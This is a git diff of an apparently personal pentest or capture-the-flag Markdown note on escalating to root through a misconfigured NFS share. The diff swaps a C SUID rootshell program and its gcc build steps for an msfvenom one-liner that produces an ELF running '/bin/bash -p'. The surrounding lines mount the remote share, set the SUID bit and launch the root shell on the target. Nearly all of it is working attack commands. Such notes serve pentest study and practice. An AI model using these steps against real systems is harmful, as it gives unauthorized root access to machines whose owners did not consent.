@@ -19,17 +19,8 @@ When we're inside the target machine, we have to check if it's an **NFS (Network
 - We have to log in as root, so `sudo su`.
 - Then let's create the NFS share: `mkdir /tmp/nfs`.
 - And let's mount the remote directory on it: `mount -o rw,vers=3 <Target IP>:<Remote dir> /tmp/nfs` 
-- Now we have to create a `rootshell.c` file to run a privileged shell:
-  ```
-  #include <stdlib.h>
-  int main() {
-      setuid(0);
-      setgid(0);
-      system("/bin/bash -p");
-      return 0;
-  }
-  ```  
-- In the end, let's compile it with `gcc rootshell.c -o /tmp/nfs/rootshell.elf` and set the SUID bit: `chmod +xs /tmp/nfs/rootshell.elf` 
+- Now we have to create a `rootshell.elf` file to run a privileged shell: `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/rootshell.elf`
+- In the end, let's set the SUID bit: `chmod +xs /tmp/nfs/rootshell.elf` 
 
 ## Last step - on the target
 - We can now launch the privileged shell from the exposed directory (`/tmp`) with `/tmp/rootshell.elf`.
